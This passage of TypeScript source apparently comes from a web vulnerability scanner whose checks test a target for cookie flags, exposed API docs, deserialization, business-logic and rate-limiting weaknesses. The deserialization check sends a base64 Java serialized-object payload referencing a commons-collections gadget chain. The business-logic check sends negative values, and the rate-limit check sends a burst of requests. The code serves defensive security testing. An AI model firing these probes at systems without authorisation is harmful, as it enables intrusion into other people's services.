            description: "Session cookies are set without the Secure flag, allowing them to be transmitted over unencrypted HTTP connections and intercepted by attackers.",
            severity: "medium",
            category: "Session Management",
            cvss_score: 5.9,
            cwe_id: "CWE-614",
            recommendation: "Set the Secure flag on all session cookies to ensure they are only sent over HTTPS connections.",
            evidence: "Session cookie(s) missing Secure attribute",
          });
        }
        
        if (!hasHttpOnly) {
          findings.push("HttpOnly flag not set");
          this.vulnerabilities.push({
            title: "Session Cookie Missing HttpOnly Flag",
            description: "Session cookies are accessible via JavaScript, making them vulnerable to theft through XSS attacks. Attackers can steal session tokens and impersonate users.",
            severity: "medium",
            category: "Session Management",
            cvss_score: 5.3,
            cwe_id: "CWE-1004",
            recommendation: "Set the HttpOnly flag on session cookies to prevent JavaScript access and mitigate XSS-based session theft.",
            evidence: "Session cookie(s) missing HttpOnly attribute",
          });
        }
        
        if (!hasSameSite) {
          this.vulnerabilities.push({
            title: "Session Cookie Missing SameSite Attribute",
            description: "Without SameSite attribute, cookies are sent with cross-site requests, making the application vulnerable to CSRF attacks.",
            severity: "medium",
            category: "Session Management",
            cvss_score: 5.0,
            cwe_id: "CWE-1275",
            recommendation: "Set SameSite=Lax or SameSite=Strict on session cookies to prevent CSRF attacks.",
            evidence: "Session cookie(s) missing SameSite attribute",
          });
        }
      }
    } catch (error) {
      // Ignore
    }
  }

  private async checkAPISecurityMisconfiguration(): Promise<void> {
    const apiPaths = ["/api", "/api/v1", "/graphql", "/swagger", "/api-docs"];
    
    for (const path of apiPaths) {
      try {
        const testUrl = new URL(this.targetUrl);
        testUrl.pathname = path;
        const response = await fetch(testUrl.toString());
        
        if (response.status === 200) {
          const text = await response.text();
          
          if (text.includes("swagger") || text.includes("openapi") || text.includes("graphql")) {
            this.vulnerabilities.push({
              title: "API Documentation Publicly Accessible",
              description: "API documentation or GraphQL introspection is publicly accessible, revealing API endpoints, parameters, and data structures to potential attackers.",
              severity: "medium",
              category: "API Security",
              cvss_score: 5.3,
              cwe_id: "CWE-200",
              recommendation: "Restrict access to API documentation in production. Disable GraphQL introspection. Require authentication for API documentation endpoints.",
              evidence: `API documentation found at ${path}`,
            });
            break;
          }
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  private async checkInsecureDeserialization(): Promise<void> {
    // Check for Java deserialization
    const payload = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvcv/";
    
    try {
      const response = await fetch(this.targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-java-serialized-object" },
        body: atob(payload),
      });
      
      // If server processes it, it might be vulnerable
      if (response.status !== 415) { // 415 = Unsupported Media Type
        this.vulnerabilities.push({
          title: "Potential Insecure Deserialization",
          description: "The application may deserialize untrusted data, which can lead to remote code execution, denial of service, or authentication bypass.",
          severity: "critical",
          category: "Deserialization",
          cvss_score: 9.8,
          cwe_id: "CWE-502",
          recommendation: "Avoid deserializing untrusted data. Use JSON or other safe formats. Implement integrity checks with digital signatures. Use allowlisting for deserializable classes.",
          evidence: "Application accepted serialized object data",
        });
      }
    } catch (error) {
      // Ignore
    }
  }

  private async checkBusinessLogicFlaws(): Promise<void> {
    // Check for negative quantity in e-commerce
    const testUrl = new URL(this.targetUrl);
    testUrl.searchParams.set("quantity", "-1");
    testUrl.searchParams.set("amount", "-100");
    
    try {
      const response = await fetch(testUrl.toString());
      if (response.status === 200) {
        this.vulnerabilities.push({
          title: "Potential Business Logic Flaw",
          description: "The application may not properly validate business logic constraints, potentially allowing negative quantities, price manipulation, or workflow bypass.",
          severity: "medium",
          category: "Business Logic",
          cvss_score: 6.5,
          cwe_id: "CWE-840",
          recommendation: "Implement server-side validation for all business rules. Validate ranges, sequences, and state transitions. Test edge cases and boundary conditions.",
          evidence: "Application accepts negative values in business parameters",
        });
      }
    } catch (error) {
      // Ignore
    }
  }

  private async checkRateLimiting(): Promise<void> {
    try {
      const requests = 20;
      let successCount = 0;
      
      for (let i = 0; i < requests; i++) {
        const response = await fetch(this.targetUrl);
        if (response.status === 200) {
          successCount++;
        }
      }
      
      if (successCount === requests) {
        this.vulnerabilities.push({
          title: "Missing Rate Limiting",
          description: "The application does not implement rate limiting, allowing attackers to perform brute-force attacks, credential stuffing, or denial of service attacks.",
          severity: "medium",
          category: "Rate Limiting",
          cvss_score: 5.3,
          cwe_id: "CWE-770",
          recommendation: "Implement rate limiting on authentication endpoints and APIs. Use CAPTCHA for sensitive operations. Implement account lockout after failed attempts. Monitor for abuse patterns.",
          evidence: `${requests} rapid requests completed without rate limiting`,
        });
      }
    } catch (error) {
      // Ignore
    }
  }
}
